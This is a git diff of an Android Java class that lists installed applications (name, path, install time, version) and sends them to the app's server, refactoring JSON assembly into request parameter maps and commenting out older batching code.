@@ -2,29 +2,28 @@ package com.inet.android.list;
 
 import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
-
-import org.json.JSONException;
-import org.json.JSONObject;
+import java.util.Map;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
-import android.preference.PreferenceManager;
 import android.util.Base64;
 
 import com.inet.android.bs.NetworkChangeReceiver;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * ListApp class is designed to get the list of applications
@@ -33,10 +32,10 @@ import com.inet.android.utils.ValueWork;
  * 
  */
 @SuppressLint("NewApi")
-public class ListApp {
+public class AppList {
 	private Context mContext;
 	private String complete;
-	private static String LOG_TAG = ListApp.class.getSimpleName().toString();
+	private static String LOG_TAG = AppList.class.getSimpleName().toString();
 	private final int COMPRESSION_QUALITY = 100;
 	private int version;
 
@@ -48,13 +47,15 @@ public class ListApp {
 	@SuppressLint("NewApi")
 	public void getListOfInstalledApp(Context context) {
 		this.mContext = context;
-		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_APP, mContext);
+		version = AppSettings.getSetting(AppConstants.TYPE_LIST_APP, mContext);
 		String sendStr = null;
 
 		Logging.doLog(LOG_TAG, "getListOfInstalledApp", "getListOfInstalledApp");
 
 		// -------initial json line----------------------
-		JSONObject jsonAppList = new JSONObject();
+		RequestParams params = new RequestParams();
+		List<Map<String, String>> listOfMapsForData = new ArrayList<Map<String, String>>();
+
 		if (NetworkChangeReceiver.isOnline(context) != 0) {
 			int flags = PackageManager.GET_META_DATA
 					| PackageManager.GET_SHARED_LIBRARY_FILES
@@ -69,6 +70,8 @@ public class ListApp {
 
 				} else {
 					try {
+						Logging.doLog(LOG_TAG, "ApplicationInfo",
+								"ApplicationInfo");
 						PackageInfo packageInfo = packageManager
 								.getPackageInfo(app.packageName,
 										PackageManager.GET_PERMISSIONS);
@@ -90,40 +93,50 @@ public class ListApp {
 							byte[] b = byteArrayBitmapStream.toByteArray();
 							encodedImage = Base64.encodeToString(b,
 									Base64.DEFAULT);
-							jsonAppList.put("icon", encodedImage);
+							// params.add("data[][info][icon]", encodedImage);
 
 						}
 						// ------------------------------------------------------
 						// Send Data
 						// ------------------------------------------------------
-						jsonAppList.put("name", app.loadLabel(packageManager));
-						jsonAppList.put("dir", app.sourceDir);
-						jsonAppList.put("time", installTime);
-						jsonAppList.put("build", packageInfo.versionCode);
+						Map<String, String> data1 = new HashMap<String, String>();
+						data1.put("dir", app.sourceDir);
+						data1.put("name",app.loadLabel(packageManager).toString());
+						data1.put("time", installTime);
+						data1.put("build",Integer.toString(packageInfo.versionCode));
+						listOfMapsForData.add(data1);
 
-						if (sendStr == null)
-							sendStr = jsonAppList.toString();
-						else
-							sendStr += "," + jsonAppList.toString();
-						if (sendStr.length() >= 50000) {
-							complete = "0";
-							Logging.doLog(LOG_TAG, "str >= 50000",
-									"str >= 50000");
-							sendRequest(sendStr, complete);
-							sendStr = null;
+						// params.add("data[][info][name]",
+						// app.loadLabel(packageManager).toString());
+						// params.add("data[][info][dir]", app.sourceDir);
+						// params.add("data[][info][time]", installTime);
+						// params.add("data[][info][build]",
+						// Integer.toString(packageInfo.versionCode));
 
-						}
+						// if (sendStr == null)
+						// sendStr = jsonAppList.toString();
+						// else
+						// sendStr += "," + jsonAppList.toString();
+						// if (sendStr.length() >= 50000) {
+						// complete = "0";
+						// Logging.doLog(LOG_TAG, "str >= 50000",
+						// "str >= 50000");
+						// sendRequest(sendStr, complete);
+						// sendStr = null;
+						//
+						// }
 					} catch (PackageManager.NameNotFoundException e) {
 						e.printStackTrace();
-
-					} catch (JSONException e) {
-						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 
 					}
 				}
 			}
-			if (sendStr != null) {
-				lastRaw(sendStr);
+			if (params.hashCode() != 0) {
+				// lastRaw(params);
+				params.put("data", listOfMapsForData);
+				RequestList.sendDemandRequest(params,
+						AppConstants.TYPE_LIST_APP_REQUEST, "1", version,
+						mContext);
 				sendStr = null;
 
 			} else {
@@ -131,8 +144,7 @@ public class ListApp {
 				sendStr = null;
 			}
 		} else {
-			TurnSendList.setList(ConstantValue.TYPE_LIST_APP, version, "0",
-					mContext);
+			Queue.setList(AppConstants.TYPE_LIST_APP, version, "0", mContext);
 		}
 	}
 
@@ -143,7 +155,7 @@ public class ListApp {
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_APP_REQUEST,
+		RequestList.sendDemandRequest(str, AppConstants.TYPE_LIST_APP_REQUEST,
 				complete, version, mContext);
 	}
 }
